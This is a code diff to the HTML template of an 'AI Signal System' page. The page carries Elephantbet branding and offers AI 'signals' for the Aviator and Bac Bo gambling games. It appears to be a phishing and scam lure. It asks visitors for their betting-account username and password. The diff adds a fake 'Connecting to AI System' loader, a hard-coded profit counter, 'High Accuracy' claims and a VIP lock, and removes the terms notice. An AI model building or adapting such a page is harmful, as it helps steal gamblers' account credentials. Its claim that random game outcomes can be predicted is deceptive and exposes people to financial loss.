@@ -3,43 +3,57 @@
 <head>
     <title>AI Signal System</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <script defer src="{{ url_for('static', filename='script.js') }}"></script>
 </head>
 <body>
+
+<div id="loader">
+    <div class="loader-box">
+        <h2>Connecting to AI System...</h2>
+        <p id="loading-text">Initializing...</p>
+    </div>
+</div>
 
 <div class="overlay"></div>
 
 <div class="container">
 
+    <div class="brand">ELEPHANTBET</div>
+    <div class="beta">BETA</div>
+
+    <div class="side left">
+        <img src="https://i.imgur.com/8Km9tLL.png">
+    </div>
+
+    <div class="side right">
+        <img src="https://i.imgur.com/Y3XQZ9X.png">
+    </div>
+
     <h1>AI Signal System</h1>
 
     <p class="subtitle">
-        Login with your Elephantbet account to unlock premium signals
+        Login to unlock Aviator and Bac Bo signals
     </p>
 
-    <div class="games">
-        <img src="https://i.imgur.com/8Km9tLL.png" alt="aviator">
-        <img src="https://i.imgur.com/Y3XQZ9X.png" alt="bacbo">
+    <div class="counter">
+        Total Profit Generated: <span id="money">$1023</span>
     </div>
 
     <form method="POST">
         <input type="text" name="username" placeholder="Username" required>
         <input type="password" name="password" placeholder="Password" required>
-
         <button type="submit">Access Signals</button>
     </form>
 
+    <div class="vip-lock">
+        🔒 VIP Signals Locked
+    </div>
+
     <p class="info">
-        Bac Bo • Aviator • AI Prediction Engine
+        Smart AI Predictions • High Accuracy System
     </p>
 
     <p class="error">{{ message }}</p>
-
-    <div class="terms">
-        <small>
-            By continuing, you agree to the bot's terms of service.
-        
-        </small>
-    </div>
 
 </div>
 
